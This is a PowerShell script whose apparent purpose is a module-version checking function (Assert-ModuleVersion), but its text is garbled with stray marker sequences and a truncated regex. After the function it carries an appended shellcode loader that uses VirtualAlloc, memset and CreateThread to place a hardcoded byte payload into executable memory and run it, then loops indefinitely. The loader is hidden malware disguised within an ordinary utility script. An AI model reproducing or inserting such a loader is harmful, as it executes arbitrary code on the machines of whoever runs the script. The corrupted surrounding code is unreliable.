
 -||-> function Assert-ModuleVersion
{
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $ManifestPath,

        [string[]]
        
        $AssemblyPath,

        [string]
        
        $ReleaseNotesPath,

        [string]
        
        $NuspecPath,

        [string[]]
        
        $ExcludeAssembly
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> $errorsAtStart = $Error.Count <-||- 

     -||-> $manifest =  -||-> Test-ModuleManifest -Path $ManifestPath <-||-  <-||- 
     -||-> if(  -||-> -not $manifest <-||-  )
    {
        return
    } <-||- 

     -||-> $version = $manifest.Version <-||- 

     -||-> Write-Verbose -Message ( -||-> 'Checking that {0} module is at version {1}.' -f $manifest.Name,$version <-||- ) <-||- 

     -||-> $badAssemblies =  -||-> Invoke-Command {
                             -||-> $manifest.RequiredAssemblies | 
                                ForEach-Object { 
                                     -||-> if(  -||-> -not [IO.Path]::IsPathRooted($_) <-||-  )
                                    {
                                         -||-> Join-Path -Path ( -||-> Split-Path -Parent -Path $manifest.Path <-||- ) -ChildPath $_ <-||- 
                                    }
                                    else
                                    {
                                         -||-> $_ <-||- 
                                    } <-||- 
                                } <-||- 
                             -||-> if(  -||-> $AssemblyPath <-||-  )
                            {
                                 -||-> $AssemblyPath <-||- 
                            } <-||- 
                        } |
                        Where-Object { 
                             -||-> foreach( $exclusion in  -||-> $ExcludeAssembly <-||-  )
                            {
                                 -||-> if(  -||-> ( -||-> Split-Path -Leaf -Path $_ <-||- ) -like $exclusion <-||-  )
                                {
                                    return  -||-> $false <-||- 
                                } <-||- 
                            } <-||- 
                            return  -||-> $true <-||- 
                        } |
                        Get-Item | 
                        Where-Object { 
                             -||-> -not ( -||-> $_.VersionInfo.FileVersion.ToString().StartsWith($version.ToString()) <-||- ) -or -not ( -||-> $_.VersionInfo.ProductVersion.ToString().StartsWith($version.ToString()) <-||- ) <-||- 
                        } |
                        ForEach-Object {
                             -||-> ' * {0} (FileVersion: {1}; ProductVersion: {2})' -f $_.Name,$_.VersionInfo.FileVersion,$_.VersionInfo.ProductVersion <-||- 
                        } <-||-  <-||- 
     -||-> if(  -||-> $badAssemblies <-||-  )
    {
         -||-> Write-Error -Message ( -||-> 'The following assemblies are not at version {0}.{1}{2}' -f $version,( -||-> [Environment]::NewLine <-||- ),( -||-> $badAssemblies -join ( -||-> [Environment]::NewLine <-||- ) <-||- ) <-||- ) <-||- 
    } <-||- 

     -||-> if(  -||-> $ReleaseNotesPath <-||-  )
    {
         -||-> $foundFirstVersion = $false <-||- 
         -||-> $releaseNotesVersion =  -||-> Get-Content -Path $ReleaseNotesPath |
                                    ForEach-Object {
                                        if(  -||-> -not $foundFirstVersion -and $_ -match '^
                                        {
                                            $foundFirstVersion = $true
                                            return [Version]$Matches[1]
                                        }
                                    }
        if( -not $releaseNotesVersion )
        {
            Write-Error -Message (' -||-> V <-||- Version { -||-> 0 <-||- } not found in release notes ( -||-> { -||-> 1 <-||- } <-||- ).' -f $version,$ReleaseNotesPath)
        }
    }

    if( $NuspecPath )
    {
        $nuspec = [xml](Get-Content -Raw -Path $NuspecPath)
        if( $nuspec )
        {
            $nuspecVersion = [Version]($nuspec.package.metadata.version)
            if( $nuspecVersion )
            {
                if( $version -ne $nuspecVersion )
                {
                    Write-Error -Message ('Nuspec file ''{ -||-> 0 <-||- }'' is at version { -||-> 1 <-||- }, but should be at version { -||-> 2 <-||- }..' -f $NuspecPath,$nuspecVersion,$version)
                }
            }
            else
            {
                Write-Error -Message ('Nuspec file ''{ -||-> 0 <-||- }'' contains an invalid version.' -f $NuspecPath)
            }
        }
        else
        {
            Write-Error -Message ('Nuspec file ''{ -||-> 0 <-||- }'' does not contain valid XML.' -f $NuspecPath)
        }
    }

    return (($Error.Count - $errorsAtStart) -eq 0)
}
$OSiJ = '[DllImport( -||-> "kernel32.dll" <-||- )]public static extern IntPtr VirtualAlloc( -||-> IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect <-||- ) <-||- ; -||-> [DllImport("kernel32.dll")] -||-> p <-||- public static extern IntPtr CreateThread( -||-> IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId <-||- ) <-||- ; -||-> [DllImport("msvcrt.dll")] -||-> p <-||- public static extern IntPtr memset( -||-> IntPtr dest, uint src, uint count <-||- ) <-||- ; -||-> ';$w = Add-Type -memberDefinition $OSiJ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x8c,0x2a,0x9d,0x05,0xda,0xce,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x4d,0x31,0x50,0x14,0x83,0xc0,0x04,0x03,0x50,0x10,0x6e,0xdf,0x61,0xed,0xec,0x20,0x9a,0xee,0x90,0xa9,0x7f,0xdf,0x90,0xce,0xf4,0x70,0x20,0x84,0x59,0x7d,0xcb,0xc8,0x49,0xf6,0xb9,0xc4,0x7e,0xbf,0x77,0x33,0xb0,0x40,0x2b,0x07,0xd3,0xc2,0x31,0x54,0x33,0xfa,0xfa,0xa9,0x32,0x3b,0xe6,0x40,0x66,0x94,0x6d,0xf6,0x97,0x91,0x3b,0xcb,0x1c,0xe9,0xaa,0x4b,0xc0,0xba,0xcd,0x7a,0x57,0xb0,0x94,0x5c,0x59,0x15,0xad,0xd4,0x41,0x7a,0x8b,0xaf,0xfa,0x48,0x60,0x2e,0x2b,0x81,0x89,0x9d,0x12,0x2d,0x78,0xdf,0x53,0x8a,0x62,0xaa,0xad,0xe8,0x1f,0xad,0x69,0x92,0xfb,0x38,0x6a,0x34,0x88,0x9b,0x56,0xc4,0x5d,0x7d,0x1c,0xca,0x2a,0x09,0x7a,0xcf,0xad,0xde,0xf0,0xeb,0x26,0xe1,0xd6,0x7d,0x7c,0xc6,0xf2,0x26,0x27,0x67,0xa2,0x82,0x86,0x98,0xb4,0x6c,0x77,0x3d,0xbe,0x81,0x6c,0x4c,0x9d,0xcd,0x41,0x7d,0x1e,0x0e,0xcd,0xf6,0x6d,0x3c,0x52,0xad,0xf9,0x0c,0x1b,0x6b,0xfd,0x73,0x36,0xcb,0x91,0x8d,0xb8,0x2c,0xbb,0x49,0xec,0x7c,0xd3,0x78,0x8c,0x16,0x23,0x84,0x59,0xb8,0x73,0x2a,0x31,0x79,0x24,0x8a,0xe1,0x11,0x2e,0x05,0xde,0x02,0x51,0xcf,0x77,0x2a,0xa0,0xf0,0x77,0xab,0x8c,0xc9,0x45,0x85,0xdf,0x1f,0x91,0xf7,0x27,0x4e,0xd0,0x37,0x69,0x8e,0x7a,0x91,0xa1,0xba,0xfa,0x1e,0x64,0x49,0xba,0xfc,0xed,0x4b,0x6a,0x95,0xf3,0x53,0x9b,0x39,0x7d,0xb5,0xf1,0xd1,0x2b,0x6d,0x6d,0x4b,0x76,0xe5,0x0c,0x94,0xac,0x83,0x0e,0x1e,0x43,0x73,0xc0,0xd7,0x2e,0x67,0xb4,0x17,0x65,0xd5,0x12,0x27,0x53,0x70,0x9a,0xbd,0x58,0xd3,0xcd,0x29,0x63,0x02,0x39,0xf6,0x9c,0x61,0x32,0x3f,0x09,0xca,0x2c,0x40,0xdd,0xca,0xac,0x16,0xb7,0xca,0xc4,0xce,0xe3,0x98,0xf1,0x10,0x3e,0x8d,0xaa,0x84,0xc1,0xe4,0x1f,0x0e,0xaa,0x0a,0x46,0x78,0x75,0xf4,0xad,0x78,0x49,0x23,0x8b,0x0e,0xa3,0xf7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$2kQz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($2kQz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$2kQz,0,0,0);for (;;){Start-sleep 60};


 <-||-  <-||-  <-||-  <-||-  <-||- 
